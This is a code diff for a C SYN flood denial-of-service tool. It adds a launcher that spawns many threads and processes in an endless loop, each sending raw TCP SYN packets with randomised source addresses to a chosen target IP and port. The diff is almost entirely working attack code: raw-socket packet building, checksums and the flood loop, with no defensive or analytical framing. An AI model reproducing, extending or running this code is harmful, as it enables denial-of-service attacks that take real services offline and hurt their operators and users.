@@ -13,10 +13,18 @@
 #include <netinet/in.h>
 #include <arpa/inet.h>
 
+#include <string.h>
+#include <unistd.h>
+#include <pthread.h>
+#include <sys/wait.h>
+#include <sys/time.h>
+#include <sys/types.h>
+#include <signal.h>
+
 #include "attack_syn_flood_dos.h"
 #include "../main.h"
 
-// from ../core/debug.c
+// from ../core/core_log.c
 extern int DisplayDebug(const int message_debug_level, const int user_debug_level, const char *fmt, ...);
 extern int DisplayInfo(const char *fmt, ...);
 extern int DisplayWarning(const char *fmtsring, ...);
@@ -49,7 +57,7 @@ static unsigned short CalculateSum(unsigned short *ptr, int nbytes)
 }
 
 //int attack(const struct AHTTP_INPUT *ainput)
-static int Attack(const pSYNStruct s, const int debug_level)
+static int SendSYN(const pSYNStruct ss, const int debug_level)
 {
     // start attack now
     // create a raw socke
@@ -81,7 +89,7 @@ static int Attack(const pSYNStruct s, const int debug_level)
     struct sockaddr_in sin;
     struct pseudo_header psh;
 
-    if (!strncpy(source_ip, s->src_ip, SYN_FLOOD_IP_BUFFER_SIZE))
+    if (!strncpy(source_ip, ss->src_ip, SYN_FLOOD_IP_BUFFER_SIZE))
     {
         DisplayError("Attack strncpy failed");
         return 1;
@@ -89,10 +97,10 @@ static int Attack(const pSYNStruct s, const int debug_level)
     //strcpy(source_ip, "192.168.1.1");
 
     sin.sin_family = AF_INET;
-    sin.sin_port = htons((int)s->dst_port);
+    sin.sin_port = htons((int)ss->dst_port);
     //sin.sin_port = htons(80);
     // Target
-    sin.sin_addr.s_addr = inet_addr(s->dst_ip);
+    sin.sin_addr.s_addr = inet_addr(ss->dst_ip);
     //sin.sin_addr.s_addr = inet_addr("1.2.3.4");
 
     // Zero out the buffer
@@ -122,10 +130,10 @@ static int Attack(const pSYNStruct s, const int debug_level)
     iph->check = CalculateSum((unsigned short *)datagram, iph->tot_len >> 1);
 
     // TCP Header
-    tcph->source = htons((int)s->src_port);
+    tcph->source = htons((int)ss->src_port);
     //tcph->source = htons(3306);
     //tcph->source = htons(1234);
-    tcph->dest = htons((int)s->dst_port);
+    tcph->dest = htons((int)ss->dst_port);
     //tcph->dest = htons(80);
     tcph->seq = 0;
     tcph->ack_seq = 0;
@@ -183,7 +191,7 @@ static int Attack(const pSYNStruct s, const int debug_level)
     //while (1)
     //{
     //Send the packet
-    for (i = 0; i < s->loop; i++)
+    for (i = 0; i < ss->loop; i++)
     {
         //int l;
         if (sendto(
@@ -209,7 +217,7 @@ static int Attack(const pSYNStruct s, const int debug_level)
     return 0;
 }
 
-int SYNFloodAttack_Thread(pInput input)
+static int AttackThread(pInput input)
 {
     // now we start the syn flood attack
     extern void FreeSplitURLBuff(pSplitURLOutput p);
@@ -291,7 +299,7 @@ int SYNFloodAttack_Thread(pInput input)
         // rport is random source port
         for (i = 0; i < input->each_ip_repeat; i++)
         {
-            if (Attack(syn_struct, input->debug_level))
+            if (SendSYN(syn_struct, input->debug_level))
             {
                 DisplayError("SYNFloodAttack_Thread Attack failed");
                 return 1;
@@ -300,6 +308,136 @@ int SYNFloodAttack_Thread(pInput input)
         FreeRandomIPBuff(syn_struct->src_ip);
     }
     free(syn_struct);
+    return 0;
+}
+
+static void SignalExit(int signo)
+{
+    // for show message
+    DisplayInfo("Quit the program now");
+    exit(0);
+}
+
+int StartSYNFloodAttack(const pInput input)
+{
+    // run function in thread
+    // this attack type must run as root
+
+    pid_t pid, wpid;
+    pthread_t tid[input->max_thread];
+    pthread_attr_t attr;
+    int i, j, ret;
+    int status = 0;
+
+    DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "Enter StartSYNFlood");
+
+    signal(SIGINT, SignalExit);
+    // unlimit loop
+    for (;;)
+    {
+        // only one process
+        if (input->max_process <= 1)
+        {
+            for (j = 0; j < input->max_thread; j++)
+            {
+                //input->serial_num = (i * input->max_thread) + j;
+                if (pthread_attr_init(&attr))
+                {
+                    DisplayError("StartGuess pthread_attr_init failed");
+                    return 1;
+                }
+                //if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED))
+                if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE))
+                {
+                    DisplayError("StartGuess pthread_attr_setdetachstate failed");
+                    return 1;
+                }
+                // create thread
+                ret = pthread_create(&tid[j], &attr, (void *)AttackThread, input);
+                //printf("j is: %d\n", j);
+                DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "tid: %ld", tid[j]);
+                // here we make a map
+                if (ret != 0)
+                {
+                    DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "ret: %d", ret);
+                    DisplayError("Create pthread failed");
+                    return 1;
+                }
+                pthread_attr_destroy(&attr);
+            }
+            //pthread_detach(tid);
+            // join them all
+            for (j = 0; j < input->max_thread; j++)
+            {
+                pthread_join(tid[j], NULL);
+            }
+        }
+        else
+        {
+            // muti process
+            for (i = 0; i < input->max_process; i++)
+            {
+                pid = fork();
+                DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "pid: %d", pid);
+                if (pid == 0)
+                {
+                    // child process
+                    for (j = 0; j < input->max_thread; j++)
+                    {
+                        //input->serial_num = (i * input->max_thread) + j;
+                        if (pthread_attr_init(&attr))
+                        {
+                            DisplayError("StartGuess pthread_attr_init failed");
+                            return 1;
+                        }
+                        //if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_DETACHED))
+                        if (pthread_attr_setdetachstate(&attr, PTHREAD_CREATE_JOINABLE))
+                        {
+                            DisplayError("StartGuess pthread_attr_setdetachstate failed");
+                            return 1;
+                        }
+                        // create thread
+                        ret = pthread_create(&tid[j], &attr, (void *)AttackThread, input);
+                        //printf("j is: %d\n", j);
+                        DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "tid: %ld", tid[j]);
+                        // here we make a map
+                        if (ret != 0)
+                        {
+                            DisplayDebug(DEBUG_LEVEL_2, input->debug_level, "ret: %d", ret);
+                            DisplayError("Create pthread failed");
+                            return 1;
+                        }
+                        pthread_attr_destroy(&attr);
+                    }
+                    //pthread_detach(tid);
+                    // join them all
+                    for (j = 0; j < input->max_thread; j++)
+                    {
+                        pthread_join(tid[j], NULL);
+                    }
+                }
+                else if (pid < 0)
+                {
+                    DisplayError("Create process failed");
+                }
+                // Father process
+                while ((wpid = wait(&status)) > 0)
+                {
+                    // nothing here
+                    // wait the child process end
+                }
+            }
+        }
+    }
+    return 0;
+}
+
+int StartSYNFloodTest(const pInput input)
+{
+    // run function in thread
+    // this attack type must run as root
+    DisplayDebug(DEBUG_LEVEL_3, input->debug_level, "Enter StartSYNFloodTest");
+    AttackThread(input);
     return 0;
 }
 
